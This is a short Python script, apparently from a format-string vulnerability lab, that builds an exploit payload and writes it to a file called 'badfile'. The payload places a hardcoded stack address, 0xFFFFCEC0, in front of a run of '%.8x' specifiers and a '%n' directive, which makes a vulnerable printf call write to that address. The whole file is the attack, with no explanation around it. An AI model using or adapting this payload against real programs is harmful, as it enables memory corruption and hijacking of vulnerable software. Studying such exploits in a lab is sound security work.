import sys

# Initialize the content array
CONTENT_LENGTH = 2000
content = bytearray(0x0 for i in range(CONTENT_LENGTH))

fmt1 = ("%.8x" * 0).encode()  # x is unsigned int as a hexadecimal number
content[: len(fmt1)] = fmt1
print(fmt1)

target_address = 0xFFFFCEC0
content[len(fmt1) : len(fmt1) + 4] = target_address.to_bytes(4, byteorder="little")

N = 4
fmt2 = ("%.8x" * N + "%n" + "\n").encode()
content[len(fmt1) + 4 : len(fmt1) + 4 + len(fmt2)] = fmt2
print(fmt2)

# Write the content to badfile
file = open("badfile", "wb")
file.write(content)
file.close()
